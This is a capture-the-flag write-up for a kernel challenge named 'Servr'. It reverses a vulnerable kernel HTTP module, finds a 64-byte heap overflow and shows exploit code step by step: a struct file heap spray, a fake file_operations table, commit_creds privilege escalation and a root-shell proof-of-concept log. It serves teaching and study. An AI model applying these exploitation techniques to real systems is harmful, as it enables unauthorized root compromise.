# Servr (kernel, heap overflow, struct file, -smep, -smap, -kaslr)

## Enumeration
As always I've started with extracting initramfs.img:

```console
$ mkdir extracted
$ cd extracted
$ zcat ../initramfs.img | cpio -idvm
[...]
$ find . -type f -name "*.ko"
./home/servr/servr.ko
```

I've noticed that the hardest part for me recently in pwn challenges is reversing the binary part. In this challenge we were given not even stripped binary!

```console
$ file ./home/servr/servr.ko
./home/servr/servr.ko: ELF 64-bit LSB relocatable, x86-64, version 1 (SYSV), BuildID[sha1]=77e481ea5fc3dca4da64867f89d83ec149bf429a, not stripped
```

The source code is large and I made many simplifications therefore I will only show some of functionalities.

In general the kernel module is a HTTP server running on port 80. As a user we can connect to it and send requests. The request in then being parsed. If it is correct request is incorrect we receive an error code 400 in message body:

```console
$ echo -ne "ABCDEFG" | nc 127.0.0.1 80
HTTP/1.1 200 OK
Server: servr/1.0
Content-type: text/plain

400 Invalid Request
```

but if the request is correct we receive a wierd truncated response:

```console
$ echo -ne "POST aaa HTTP/1.0\r\nContent-type: plain/text\r\nContent-Length:40
\r\n\r\naaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaa" | nc 127.0.0.1 80
HTTP/1.1 200 OK
Server: servr/1.0
Cont 
```

Request is correctly parsed if:
- [ ] it starts with correct method, either GET of POST
- [ ] it has a valid http version in first line either HTTP/1.0 or HTTP/1.1
- [ ] it has \r\n\r\n after first line, seperating headers from request body
- [ ] it contains Content-Length header. The Content-Length cannot be larger then the length of a request body


What's more interesting, sending a correct request we sometimes get kernel to panic!

```console
$ echo -ne "POST aaa HTTP/1.0\r\nContent-type: plain/text\r\nContent-Length:70
\r\n\r\naaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaara" 
| nc 127.0.0.1 80
[  312.996817] general protection fault: 0000 [#1] SMP 
[  312.997909] Modules linked in: servr(O)
[  312.998319] CPU 0 
[  312.998759] Pid: 846, comm: sh Tainted: G           O 3.8.7 #35 QEMU Standard PC (i440FX + PIIX, 1996)
[  312.999385] RIP: 0010:[<ffffffff811128ee>]  [<ffffffff811128ee>] anon_vma_clone+0x4e/0x130
[  313.000568] RSP: 0018:ffff880002f01d40  EFLAGS: 00000286
[  313.000859] RAX: ffff880002f9ccc0 RBX: ffff880002f9e7e8 RCX: 0000000000003653
[  313.001297] RDX: 0000000000000040 RSI: 0000000000000200 RDI: ffff880003801700
[  313.001703] RBP: ffff880002f01d80 R08: 0000000000015420 R09: 0000000000400000
[  313.002149] R10: ffff8800032536f0 R11: 0000000000000000 R12: ffff880002f9c800
[  313.002542] R13: 0000000000000000 R14: ffff880002f9ccc0 R15: 6161616461616163
[  313.002879] FS:  0000000000000000(0000) GS:ffff880003c00000(0000) knlGS:00000
```

I've looked back into code and I saw that when request is successfully parsed, the `finish_handle_request` is invoked:

```c
#define ERROR_RESPONSE "HTTP/1.1 200 OK\r\n"          \
                       "Server: servr/1.0\r\n"        \
                       "Content-type: text/plain\r\n" \
                       "\r\n"                         \
                       "400 Invalid Request"
#define VALID_RESPONSE_HDR "HTTP/1.1 200 OK\r\n"          \
                           "Server: servr/1.0\r\n"        \
                           "Content-type: text/plain\r\n" \
                           "\r\n"

void finish_handle_request(void *arg)
{
    [...]
    
    if (!arg->content_length)
    {
        /* User has not provided Content-Type header */
        arg->resp = ERROR_RESPONSE;
        arg->resp_len = strlen(ERROR_RESPONSE);
    }
    else
    {
        arg->resp = kmalloc(arg->content_length, GFP_KERNEL); // 1
        strcpy(arg->resp, VALID_RESPONSE_HDR); // 2
        memcpy(&arg->resp[strlen(VALID_RESPONSE_HDR)], arg->req_body_ptr, arg->content_length); // 3
    }
    client_handle_send(arg);
}
```

So if the user provided a valid request with Content-Type header, the kernel will:
1) allocate space for response of length Content-Type
2) fill the response prefix with VALID_RESPONSE_HDR of length 64 bytes
3) copy the request body after the header

This means that I could overflow the buffer by 64 bytes! This also is a reason of above kernel panic! Now the question was how can I exploit this bug!

## Exploit
Following hint given in the challenge description:

```
"Hint: Try controlling f_op in struct file or something."
```

I've decided I will try to overflow `struct file`. It is a good candidate as at offset 32 (<64) it has struct file_operations *f_op field which is a pointer to virtual function table:

```c
struct file {
	/*
	 * fu_list becomes invalid after file_free is called and queued via
	 * fu_rcuhead for RCU freeing
	 */
	union {
		struct list_head	fu_list;
		struct rcu_head 	fu_rcuhead;
	} f_u; // 16 bytes
	struct path		f_path; // 16 bytes
#define f_dentry	f_path.dentry
#define f_vfsmnt	f_path.mnt
	const struct file_operations	*f_op;
    [...]
```

So the idea is to create a fake virtual function table in userland and fill it with address of malicious function:

```c
uint64_t g_escalated;
uint64_t g_fake_fops[20];

void escalate()
{
    commit_creds(prepare_kernel_cred(NULL));
    g_escalated = 1;
}

int init()
{
    [...]    
    g_escalated = 0;
    for (int i = 0; i < 20; ++i)
    {
        g_fake_fops[i] = (uint64_t)&escalate;
    }
    [...]
}
```

Then to allocate many struct files in kernel by creating some random files, free half of them to create holes in memory and finaly send message which will hopefully overflow one of the struct files:

```c
#define HEAP_SPRAY_POWER 0x400

int send_overflow_msg()
{
    if (write(g_server_sock_fd, g_overflow_msg, g_overflow_msg_len) < 0)
    {
        perror("\t[!] Failed to send msg");
        return -1;
    }
    printf("\t[+] Send msg\n");

    return 0;
}

void overflow_struct_file()
{
    char file_path[0x100];

    /* Make kernel allocate multiple struct file. */
    for (int i = 0; i < HEAP_SPRAY_POWER; ++i)
    {
        sprintf(file_path, "/tmp/file_%d", i);
        g_fds[i] = open(file_path, O_CREAT | O_RDWR, 0644);
    }
    /* Now make kernel free every second struct file, creating holes in slabs. */
    for (int i = 0; i < HEAP_SPRAY_POWER; i += 2)
    {
        if (g_fds[i])
        {
            close(g_fds[i]);
            g_fds[i] = 0;
        }
    }
    /* And quickly try to allocate msg so it lands in the hole and overflow one of the struct files. */
    send_overflow_msg();
}
```

The message has to overflow the f_op field so it points to fake vtable, but it has to be a valid request so I created it like this:

```c
#define FILE_STRUCT_SLAB_SIZE 256
#define MSG_PREFIX "GET aaa HTTP/1.1\r\n"   \
                   "Content-Length:232\r\n" \
                   "\r\n"

uint64_t g_overflow_msg[37];
size_t g_overflow_msg_len;

int init() {
    [...]
    /* Fill g_overflow_msg structure with msg_prefix concatenated with addresses of g_fake_fops. */
    g_overflow_msg_len = strlen(MSG_PREFIX) + FILE_STRUCT_SLAB_SIZE;
    memcpy((void *)g_overflow_msg, MSG_PREFIX, strlen(MSG_PREFIX));
    /* This is possible as strlen(MSG_PREFIX) % 8 == 0. */
    for (int i = strlen(MSG_PREFIX) / sizeof(uint64_t); i < g_overflow_msg_len / sizeof(uint64_t); ++i)
    {
        g_overflow_msg[i] = (uint64_t)&g_fake_fops;
    }
    [...]
}
```

The good thing is that there is no smep, smap or kaslr enabled. Therefore we can directly call escalate function in userland which will increase our proccess privilages. Then we can just pop shell

```c
void pop_shell() {
    printf("\t[+] Poping shell... have fun!\n");
    system("/bin/sh");
    printf("\t[ ] Had fun?\n");
    exit(0);
}
```

### POC
[Full exploit](exploit.c)

```c
/ $ id
uid=1000(servr) gid=1000(servr) groups=1000(servr)
/ $ ./exploit
*** Starting Exploit ***
[ ] Initializing...
	[+] Created socket
	[+] Connected to server
	[i] Address of g_fake_fops: 0x6be540
	[i] Address of escalate function: 0x400b7f
	[i] Address of g_escalated: 0x6be728
[+] Succeeded to initialize
[ ] Overflowing struct file...
	[+] Send msg
[+] Finished overflow phase, can't be sure yet if we succeeded
[ ] Sleeping... (if kernel panic now, it means we overflowed not ours stuct) 0 1 2
[ ] Triggering exploit...
[+] Exploit succeeded
	[+] Poping shell... have fun!
/ # id
uid=0(root) gid=0(root)
```

Note: Unfortunetely there is something I'm missing and the kernel panics just after executing first command (so I'm able to read a flag, but it wouldn't be very usefull in real life). I will update it after I find a bug.